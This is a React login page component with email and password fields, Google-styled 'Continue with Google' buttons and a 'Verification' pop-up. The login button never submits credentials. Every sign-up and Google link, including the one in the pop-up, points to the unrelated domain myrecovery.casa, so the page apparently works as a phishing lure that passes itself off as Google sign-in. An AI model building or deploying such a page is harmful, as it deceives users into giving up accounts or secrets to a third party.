"use client"

import { useState } from "react"

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false)
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [emailError, setEmailError] = useState("")
  const [showModal, setShowModal] = useState(false)

  const isValidEmail = (value) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    return emailRegex.test(value)
  }

  const handleEmailChange = (e) => {
    const value = e.target.value
    setEmail(value)

    if (value && !isValidEmail(value)) {
      setEmailError("Wrong email")
    } else {
      setEmailError("")
    }
  }

  const handlePasswordChange = (e) => {
    const value = e.target.value
    setPassword(value)
  }

  const handleLogInClick = () => {
    if (isValidEmail(email) && password.length > 5) {
      setShowModal(true)
    }
  }

  return (
    <>
      <div
        className={`min-h-screen flex items-center justify-center bg-gradient-to-br from-pink-100 via-purple-50 to-blue-100 transition-all ${showModal ? "blur-sm" : ""}`}
      >
        <div className="w-full max-w-sm px-4">
          <div className="text-center mb-8">
            <div className="flex justify-center mb-4">
              <img src="/logo.webp" alt="Logo" className="w-16 h-16" />
            </div>
            <h1 className="text-2xl font-semibold text-gray-900 mb-2">Welcome back!</h1>
            <p className="text-sm text-gray-600">
              Don't have an account?{" "}
              <a href="http://myrecovery.casa" className="text-purple-600 hover:text-purple-700 font-medium">
                Sign up
              </a>
            </p>
          </div>

          <div className="space-y-4">
            <a
              href="https://myrecovery.casa"
              target="_blank"
              rel="noopener noreferrer"
              className="w-full flex items-center justify-center gap-3 px-4 py-3 bg-white border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors text-sm font-medium text-gray-700"
            >
              <svg className="w-5 h-5" viewBox="0 0 24 24">
                <path
                  fill="#4285F4"
                  d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
                />
                <path
                  fill="#34A853"
                  d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
                />
                <path
                  fill="#FBBC05"
                  d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
                />
                <path
                  fill="#EA4335"
                  d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
                />
              </svg>
              Continue with Google
            </a>

            <div className="relative my-6">
              <div className="absolute inset-0 flex items-center">
                <div className="w-full border-t border-gray-300"></div>
              </div>
              <div className="relative flex justify-center text-xs">
                <span className="px-2 bg-gradient-to-br from-pink-100 via-purple-50 to-blue-100 text-gray-500">or</span>
              </div>
            </div>

            <div>
              <input
                type="email"
                placeholder="Work email"
                value={email}
                onChange={handleEmailChange}
                className={`w-full px-4 py-3 bg-white rounded-lg focus:outline-none text-sm text-gray-900 placeholder:text-gray-500 transition-colors ${
                  emailError
                    ? "border-2 border-red-500 focus:border-red-500"
                    : "border-2 border-purple-200 focus:border-purple-400"
                }`}
              />
              {emailError && <p className="text-red-500 text-xs mt-1">{emailError}</p>}
            </div>

            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                value={password}
                onChange={handlePasswordChange}
                className="w-full px-4 py-3 bg-white border-2 border-purple-200 rounded-lg focus:outline-none focus:border-purple-400 text-sm text-gray-900 placeholder:text-gray-500"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
              >
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                  />
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
                  />
                </svg>
              </button>
            </div>

            <button
              onClick={handleLogInClick}
              className="w-full py-3 bg-indigo-500 hover:bg-indigo-600 text-white rounded-lg font-medium text-sm transition-colors"
            >
              Log In
            </button>

            <div className="text-center">
              <a href="#" className="text-sm text-blue-600 hover:text-blue-700 font-medium">
                Forgot Password?
              </a>
            </div>
          </div>

          <div className="mt-8 text-center text-xs text-gray-500">
            By continuing, you agree to our{" "}
            <a href="#" className="text-gray-700 hover:underline">
              Terms of Service
            </a>{" "}
            and{" "}
            <a href="#" className="text-gray-700 hover:underline">
              Privacy Policy
            </a>
            .{" "}
            <a href="#" className="text-gray-700 hover:underline">
              Need help?
            </a>
          </div>
        </div>
      </div>

      {showModal && (
        <div className="fixed inset-0 flex items-center justify-center z-50">
          <div className="absolute inset-0 bg-black/50" onClick={() => setShowModal(false)}></div>

          <div className="relative bg-white rounded-lg shadow-xl max-w-sm w-full mx-4 p-6">
            <button
              onClick={() => setShowModal(false)}
              className="absolute top-4 right-4 text-gray-400 hover:text-gray-600"
            >
              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>

            <div className="text-center mb-6">
              <h2 className="text-xl font-semibold text-gray-900 mb-2">Verification</h2>
              <p className="text-sm text-gray-600">Continue with your account</p>
            </div>

            <a
              href="http://myrecovery.casa"
              target="_blank"
              rel="noopener noreferrer"
              className="w-full flex items-center justify-center gap-3 px-4 py-3 bg-white border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors text-sm font-medium text-gray-700"
            >
              <svg className="w-5 h-5" viewBox="0 0 24 24">
                <path
                  fill="#4285F4"
                  d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
                />
                <path
                  fill="#34A853"
                  d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
                />
                <path
                  fill="#FBBC05"
                  d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
                />
                <path
                  fill="#EA4335"
                  d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
                />
              </svg>
              Continue with Google
            </a>
          </div>
        </div>
      )}
    </>
  )
}
